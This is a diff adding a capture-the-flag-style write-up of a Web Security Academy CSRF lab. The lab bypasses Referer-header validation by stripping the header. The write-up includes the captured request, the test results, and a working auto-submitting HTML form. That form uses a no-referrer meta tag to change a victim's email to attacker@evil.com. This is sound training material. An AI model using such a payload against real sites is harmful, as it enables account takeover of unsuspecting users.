@@ -1,0 +1,49 @@
+CSRF - Referer Header Validation: Bypass by Removing the Header
+
+Category: CSRF
+Difficulty: Practitioner
+
+### Overview / What I Learned
+Some websites rely on the Referer header for CSRF protection.
+If the Referer header is missing, the server may incorrectly assume the request is legitimate.
+We can exploit this logic by ensuring the Referer header is not sent in a cross-site request.
+
+###Exploit Steps / Attack Methodology
+1. Recon and Analysis
+Logged in as wiener:peter using Burp's browser.
+
+Navigated to the “Change Email” functionality.
+
+Captured the POST request to /my-account/change-email:
+
+POST /my-account/change-email HTTP/1.1
+Host: <LAB-ID>.web-security-academy.net
+...
+Referer: https://<LAB-ID>.web-security-academy.net/my-account
+Tested two behaviors using Burp Repeater:
+
+ Referer present and matches → Request accepted
+
+ Referer changed to malicious domain → Request rejected
+
+ Referer header removed → Request accepted
+
+2. Crafting the Exploit
+Included a <meta name="referrer" content="no-referrer"> tag to suppress the Referer header.
+
+3. Final Payload
+<!DOCTYPE html>
+<html>
+<head>
+  <meta name="referrer" content="no-referrer">
+</head>
+<body>
+  <form action="https://<LAB-ID>.web-security-academy.net/my-account/change-email" method="POST">
+    <input type="hidden" name="email" value="attacker@evil.com" />
+    <input type="submit" value="Click me">
+  </form>
+  <script>
+    document.forms[0].submit();
+  </script>
+</body>
+</html>
